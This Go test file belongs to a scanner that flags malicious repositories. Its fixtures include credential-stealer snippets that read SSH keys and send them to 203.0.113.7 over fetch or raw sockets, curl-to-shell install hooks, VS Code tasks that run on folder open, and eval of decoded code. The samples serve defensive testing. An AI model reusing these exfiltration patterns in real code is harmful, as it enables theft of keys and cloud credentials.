package scanner

import (
	"encoding/base64"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// writeRepo creates a throwaway folder of text files. Nothing here is ever executed;
// the files only contain strings for the scanner to look at.
func writeRepo(t *testing.T, files map[string]string) string {
	t.Helper()
	dir := t.TempDir()
	for name, body := range files {
		p := filepath.Join(dir, filepath.FromSlash(name))
		if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(p, []byte(body), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	return dir
}

func scan(t *testing.T, files map[string]string) (*Result, map[string]bool) {
	t.Helper()
	res, err := Scan(writeRepo(t, files), DefaultOptions())
	if err != nil {
		t.Fatal(err)
	}
	ids := map[string]bool{}
	for _, f := range res.Findings {
		ids[f.RuleID] = true
	}
	return res, ids
}

func TestCleanRepoStaysClean(t *testing.T) {
	res, ids := scan(t, map[string]string{
		"server.js": "const express = require('express');\nconst app = express();\n" +
			"fetch('https://api.github.com/users/octocat');\napp.listen(3000);\n",
		"package.json": `{"scripts":{"start":"node server.js","dev":"vite","prepare":"husky"}}`,
		"README.md":    "Install with: curl https://example.com/install.sh | sh\n",
	})
	if res.Verdict != Clean {
		t.Fatalf("want Clean, got %s: %+v", res.Verdict, ids)
	}
}

func TestCredentialReadPlusSuspiciousServerIsDangerous(t *testing.T) {
	res, ids := scan(t, map[string]string{
		"server/util.js": "readFile('~/.ssh/id_rsa');\nfetch('http://203.0.113.7:8080/upload');\n",
	})
	for _, want := range []string{"reads-ssh-keys", "sends-to-ip-address", "reads-credentials-and-sends-data-out"} {
		if !ids[want] {
			t.Errorf("missing rule %s; got %v", want, ids)
		}
	}
	if res.Verdict != Dangerous {
		t.Fatalf("want Dangerous, got %s", res.Verdict)
	}
}

func TestCredentialPathAloneIsOnlySuspicious(t *testing.T) {
	res, ids := scan(t, map[string]string{
		"deploy.sh": "ssh -i ~/.ssh/deploy_key user@example.com 'make release'\n",
	})
	if !ids["reads-ssh-keys"] {
		t.Fatalf("expected ssh rule, got %v", ids)
	}
	if res.Verdict != Suspicious {
		t.Fatalf("want Suspicious, got %s", res.Verdict)
	}
}

func TestVSCodeFolderOpenTask(t *testing.T) {
	res, ids := scan(t, map[string]string{
		".vscode/tasks.json": `{"tasks":[{"label":"x","command":"echo hello","runOptions":{"runOn":"folderOpen"}}]}`,
	})
	if !ids["auto-runs-on-folder-open"] {
		t.Fatalf("got %v", ids)
	}
	if res.Verdict != Suspicious {
		t.Fatalf("plain echo should be Suspicious, got %s", res.Verdict)
	}

	res, _ = scan(t, map[string]string{
		".vscode/tasks.json": `{"tasks":[{"command":"curl http://example.com/x","runOptions":{"runOn":"folderOpen"}}]}`,
	})
	if res.Verdict != Dangerous {
		t.Fatalf("curl on folder open should be Dangerous, got %s", res.Verdict)
	}
}

func TestNpmInstallHooks(t *testing.T) {
	res, ids := scan(t, map[string]string{"package.json": `{"scripts":{"postinstall":"node scripts/setup.js"}}`})
	if !ids["runs-on-install"] || res.Verdict != Caution {
		t.Fatalf("want runs-on-install/Caution, got %v / %s", ids, res.Verdict)
	}
	res, ids = scan(t, map[string]string{"package.json": `{"scripts":{"preinstall":"curl http://example.com/a | sh"}}`})
	if !ids["risky-install-script"] || res.Verdict != Suspicious {
		t.Fatalf("want risky-install-script/Suspicious, got %v / %s", ids, res.Verdict)
	}
}

func TestBase64EncodedURLInEnvFile(t *testing.T) {
	enc := base64.StdEncoding.EncodeToString([]byte("http://203.0.113.7:8080/payload"))
	_, ids := scan(t, map[string]string{".env": "API_KEY=" + enc + "\n"})
	if !ids["base64-encoded-url"] {
		t.Fatalf("got %v", ids)
	}
}

func TestCodeHiddenAfterWhitespace(t *testing.T) {
	res, ids := scan(t, map[string]string{
		"app.js": "console.log('hi');" + strings.Repeat(" ", 200) + "doThing();\n",
	})
	if !ids["hidden-after-whitespace"] {
		t.Fatalf("got %v", ids)
	}
	for _, f := range res.Findings {
		if f.RuleID == "hidden-after-whitespace" && !strings.Contains(f.Snippet, "doThing") {
			t.Errorf("snippet should reveal the hidden code, got %q", f.Snippet)
		}
	}
}

func TestObfuscatedCodeWithEval(t *testing.T) {
	var b strings.Builder
	for i := 0; i < 12; i++ {
		b.WriteString("var _0x4f2a = _0x1b3c;\n")
	}
	b.WriteString("eval(payload);\n")
	res, ids := scan(t, map[string]string{"x.js": b.String()})
	if !ids["obfuscated-identifiers"] || !ids["obfuscated-and-suspicious"] {
		t.Fatalf("got %v", ids)
	}
	if res.Verdict != Dangerous {
		t.Fatalf("want Dangerous, got %s", res.Verdict)
	}
}

func TestRunsDecodedCode(t *testing.T) {
	_, ids := scan(t, map[string]string{"a.js": "eval(atob(blob));\n", "b.py": "exec(base64.b64decode(s))\n"})
	if !ids["runs-downloaded-or-decoded-code"] {
		t.Fatalf("got %v", ids)
	}
	if ids["runs-dynamic-code"] {
		t.Errorf("generic eval rule should be suppressed on the same line")
	}
}

func TestSkipsGitAndNodeModules(t *testing.T) {
	res, _ := scan(t, map[string]string{
		"node_modules/evil/index.js": "readFile('~/.ssh/id_rsa');\n",
		".git/hooks/x.js":            "readFile('~/.ssh/id_rsa');\n",
		"ok.js":                      "console.log(1);\n",
	})
	if res.Verdict != Clean {
		t.Fatalf("want Clean, got %s", res.Verdict)
	}
	res, err := Scan(writeRepo(t, map[string]string{"node_modules/evil/index.js": "readFile('~/.ssh/id_rsa');\n"}),
		Options{IncludeDeps: true})
	if err != nil || res.Verdict == Clean {
		t.Fatalf("IncludeDeps should find it: %v %v", err, res)
	}
}

func TestExecutableBinaryFlagged(t *testing.T) {
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "helper"), []byte{0x7f, 'E', 'L', 'F', 0, 0, 0, 0}, 0o644); err != nil {
		t.Fatal(err)
	}
	res, err := Scan(dir, DefaultOptions())
	if err != nil {
		t.Fatal(err)
	}
	if len(res.Findings) != 1 || res.Findings[0].RuleID != "contains-executable-binary" {
		t.Fatalf("got %+v", res.Findings)
	}
}

func TestLargeBase64BlobNotFlaggedForDataURI(t *testing.T) {
	blob := strings.Repeat("A", 600)
	_, ids := scan(t, map[string]string{"img.js": "const i = 'data:image/png;base64," + blob + "';\n"})
	if ids["long-base64-blob"] {
		t.Fatalf("data URIs should be ignored, got %v", ids)
	}
	_, ids = scan(t, map[string]string{"blob.js": "const s = '" + blob + "';\n"})
	if !ids["long-base64-blob"] {
		t.Fatalf("bare blob should be flagged, got %v", ids)
	}
}

func TestStealerOverRawSocketIsDangerous(t *testing.T) {
	res, ids := scan(t, map[string]string{
		"steal.js": "const net = require('net');\nconst fs = require('fs');\n" +
			"const key = fs.readFileSync(process.env.HOME + '/.ssh/id_rsa');\n" +
			"const sock = net.connect(4444, '203.0.113.7');\nsock.write(key);\n",
		"steal.py": "import socket, os\n" +
			"key = open(os.path.expanduser('~/.ssh/id_ed25519'), 'rb').read()\n" +
			"s = socket.create_connection(('203.0.113.7', 4444))\ns.sendall(key)\n",
	})
	if !ids["connects-by-socket-to-ip"] || !ids["reads-credentials-and-sends-data-out"] {
		t.Fatalf("missing socket or combination finding; got %v", ids)
	}
	if res.Verdict != Dangerous {
		t.Fatalf("want Dangerous, got %s", res.Verdict)
	}
	// Each file must be escalated on its own, not just one of them.
	critical := map[string]bool{}
	for _, f := range res.Findings {
		if f.Severity == Critical {
			critical[f.File] = true
		}
	}
	if !critical["steal.js"] || !critical["steal.py"] {
		t.Fatalf("both files should be critical; got %v", critical)
	}
}

func TestLocalSocketHealthCheckStaysClean(t *testing.T) {
	res, ids := scan(t, map[string]string{
		"health.js": "const net = require('net');\nnet.connect(5432, '127.0.0.1').on('connect', () => process.exit(0));\n",
		"db.py":     "import socket\ns = socket.create_connection(('10.0.0.5', 5432))\nt = socket.create_connection(('192.168.1.20', 80))\n",
		"rs.rs":     "let s = TcpStream::connect(\"172.16.0.9:80\");\n",
	})
	if res.Verdict != Clean {
		t.Fatalf("want Clean, got %s: %v", res.Verdict, ids)
	}
}

func TestSocketToPublicIPWithoutCredentialsIsOnlyCaution(t *testing.T) {
	res, ids := scan(t, map[string]string{
		"ping.go": "conn, _ := net.Dial(\"tcp\", \"203.0.113.7:80\")\n_ = conn\n",
	})
	if !ids["connects-by-socket-to-ip"] || res.Verdict != Caution {
		t.Fatalf("want Caution with socket rule, got %s %v", res.Verdict, ids)
	}
}

func TestCloudCredentialPathBuiltFromParts(t *testing.T) {
	cases := map[string]string{
		"aws.js":    "fs.readFileSync(path.join(os.homedir(), '.aws', 'credentials'))\n",
		"aws.py":    "open(os.path.join(os.path.expanduser(\"~\"), \".aws\", \"credentials\"))\n",
		"aws2.go":   "os.ReadFile(filepath.Join(home, \".aws\", \"config\"))\n",
		"gcloud.js": "path.join(os.homedir(), '.config', 'gcloud', 'application_default_credentials.json')\n",
		"azure.py":  "os.path.join(home, \".azure\", \"accessTokens.json\")\n",
		"kube.js":   "path.join(os.homedir(), '.kube', 'config')\n",
		"docker.go": "filepath.Join(home, \".docker\", \"config.json\")\n",
	}
	for name, body := range cases {
		res, ids := scan(t, map[string]string{name: body})
		if !ids["reads-cloud-credentials"] || res.Verdict != Suspicious {
			t.Errorf("%s: want reads-cloud-credentials + Suspicious, got %s %v", name, res.Verdict, ids)
		}
	}
}

func TestPlainAwsConfigObjectIsNotFlagged(t *testing.T) {
	res, ids := scan(t, map[string]string{
		"app.js": "const region = config.aws.region;\nconst cfg = { aws: { config: 'x' } };\nconsole.log('.aws docs');\n",
	})
	if res.Verdict != Clean {
		t.Fatalf("want Clean, got %s %v", res.Verdict, ids)
	}
}
